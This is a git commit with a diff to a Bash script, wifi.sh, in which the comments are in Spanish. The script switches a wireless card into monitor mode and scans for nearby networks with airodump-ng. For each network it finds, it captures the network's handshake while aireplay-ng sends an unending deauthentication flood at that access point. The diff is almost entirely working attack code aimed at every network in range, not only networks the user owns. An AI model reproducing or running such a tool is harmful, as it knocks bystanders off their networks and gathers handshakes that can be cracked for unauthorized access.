4d07b3c239ac4df3236ba4c137c6c33fc7a0f2c5
Esteban Tirini <etirini@gmail.com>
2023-08-27 15:16:50 -0400

    funcionando con loop pero duplicando las macs

--- wireless/wifi.sh
+++ wireless/wifi.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-function wlan0amonitor() {
+function wlan0monitor() {
     echo 'Cambiando monitor mode'
     sudo ifconfig wlan0 down
     sleep .8
@@ -14,7 +14,7 @@ function wlan0amonitor() {
 
 function startadump() {
     echo 'iniciando escaneo'
-    airodump-ng -w coso1 wlan0 > /dev/null & 
+    airodump-ng -w redes/redes wlan0 > /dev/null &
     airodump_pid=$!
     sleep 10
     kill $airodump_pid    
@@ -23,9 +23,14 @@ function startadump() {
 
 function recuperaredes() {
 
-    lines=$(wc -l 'coso1-01.csv' | awk '{print $1}')
+    lines=$(wc -l 'redes/redes-01.csv' | awk '{print $1}')
     numline=$((lines))
 
+    maclist=()
+    chanlist=()
+    cryolist=()
+    keylist=()
+    
     while IFS=',' read -r mac _ _ chan _ cryp _ _ _ _ _ _ _ key
     do
         mac=$(echo "$mac" | xargs)
@@ -43,19 +48,38 @@ function recuperaredes() {
                 key="${key%,}"
             fi
 
-            echo "atacando linea $numline contiene MAC: $mac, CHANNEL: $chan, SEGURIDAD: $cryp, NOMBRE: $key"
-            atacar $mac $chan $key
+
+            maclist+=("$mac")
+            chanlist+=($chan)
+            cryplist+=($cryp)
+            keylist+=($key)
+
+            beacon "$(declare -p maclist)" "$(declare -p chanlist)" "$(declare -p cryplist)" "$(declare -p keylist)" & beacon_pid=$!
+            wait $beacon_pid
+
         fi
         numline=$((numline-1))
-    done < coso1-01.csv
+    done < redes/redes-01.csv
 }
 
-function atacar() {
-    local mac=$1
-    local chan=$2
-    local key=$3
+function beacon() {
+    local maclist chanlist cryplist keylist
+    eval "$(echo "$1")"
+    eval "$(echo "$2")"
+    eval "$(echo "$3")"
+    eval "$(echo "$4")"
 
-    sudo airodump-ng -w $key -c $chan --bssid $mac wlan0 > airodump.txt
+    for ((i=0; i<${#maclist[@]}; i++)); do
+
+        xterm -e sudo airodump-ng -w caps/${keylist[$i]} -c ${chanlist[$i]} --bssid ${maclist[$i]} wlan0 & airodump_pid=$! &
+        sleep .1
+        xterm -e sudo aireplay-ng --deauth 0 -a ${maclist[$i]} wlan0 & aireplay_pid=$!
+        sleep 10
+        kill $airodump_pid
+        kill $aireplay_pid
+        echo deauthing ${maclist[$i]}
+    done
 }
 
-recuperaredes
+wlan0monitor
+
